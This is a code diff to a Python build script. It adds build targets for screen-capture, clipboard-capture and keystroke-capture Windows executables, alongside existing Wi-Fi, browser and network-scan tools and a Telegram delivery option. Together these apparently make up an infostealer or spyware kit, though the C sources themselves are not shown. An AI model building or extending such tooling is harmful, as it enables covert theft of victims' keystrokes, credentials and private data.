@@ -66,7 +66,7 @@ def main():
     i = 0
     while i < len(args):
         a = args[i]
-        if a in ("wifi", "browser", "scan", "all"):
+        if a in ("wifi", "browser", "scan", "screen", "clip", "keys", "all"):
             tool = a
         elif a == "--telegram":
             method = "telegram"
@@ -111,6 +111,27 @@ def main():
         out = os.path.join(TOOL_DIR, "net_scan.exe")
         compile_tool(src, out,
             ["ws2_32.lib", "iphlpapi.lib", "advapi32.lib", "user32.lib"],
+            defines)
+
+    if tool in ("screen", "all"):
+        src = os.path.join(TOOL_DIR, "screen_grab.c")
+        out = os.path.join(TOOL_DIR, "screen_grab.exe")
+        compile_tool(src, out,
+            ["gdi32.lib", "user32.lib", "advapi32.lib"],
+            defines)
+
+    if tool in ("clip", "all"):
+        src = os.path.join(TOOL_DIR, "clip_grab.c")
+        out = os.path.join(TOOL_DIR, "clip_grab.exe")
+        compile_tool(src, out,
+            ["user32.lib", "advapi32.lib", "shell32.lib"],
+            defines)
+
+    if tool in ("keys", "all"):
+        src = os.path.join(TOOL_DIR, "key_grab.c")
+        out = os.path.join(TOOL_DIR, "key_grab.exe")
+        compile_tool(src, out,
+            ["advapi32.lib", "user32.lib", "shell32.lib"],
             defines)
 
 
